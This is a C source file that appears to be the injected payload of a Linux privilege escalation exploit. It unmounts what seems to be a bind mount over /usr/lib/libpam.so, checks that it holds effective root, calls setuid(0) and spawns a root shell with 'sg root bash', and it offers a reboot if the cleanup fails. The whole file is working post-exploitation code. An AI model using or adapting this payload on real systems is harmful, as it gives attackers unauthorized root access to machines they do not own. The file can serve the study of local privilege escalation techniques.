//
// Created by jacoblightning3 on 10/17/24.
//

#include "injected.h"

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mount.h>


void injected_run() {
    printf("Cleaning up.\n");
    char pam[1024];
    char fullpam[2048];
    int error = 0;
    int gothrough = 1;
    printf("Reading link for /usr/lib/libpam.so.\n");
    const ssize_t charsread = readlink("/usr/lib/libpam.so", pam, sizeof(pam));
    if (charsread==-1) {
        perror("readlink");
        printf("Could not read symlink, you will have to reboot later to use most functionality again.\n\n");
        error = 1;
    }
    if (error == 0) {
        pam[charsread] = '\0';
        snprintf(fullpam, sizeof(fullpam), "/usr/lib/%s", pam);
        printf("Read link as %s\n", fullpam);
        if (umount2(fullpam, MNT_DETACH) == -1) {
            perror("umount");
            printf("Could not unmount symlink, you will have to reboot later to use most functionality again.\n\n");
            error = 1;
        }
    }
    printf("UID: %d. GID: %d. EUID: %d. EGID: %d.\n", getuid(), getgid(), geteuid(), getegid());
    if (geteuid() != 0) {
        printf("Something went wrong and we are not root. Exiting.\n");
        gothrough = 0;
    }
    if (gothrough == 1 && error == 0) {
        setuid(0);
        printf("New code running. Launching root shell.\n");
        system("sg root bash");
    }
    if (error == 1) {
        printf("This program can reboot for you now to avoid you having to force it, would you like that?\nMake sure to close opened programs.\n[y/N]");
        char answer;
        scanf("%c", &answer);
        if (answer == 'y' || answer == 'Y') {
            system("/usr/bin/reboot");
        }
    }
}
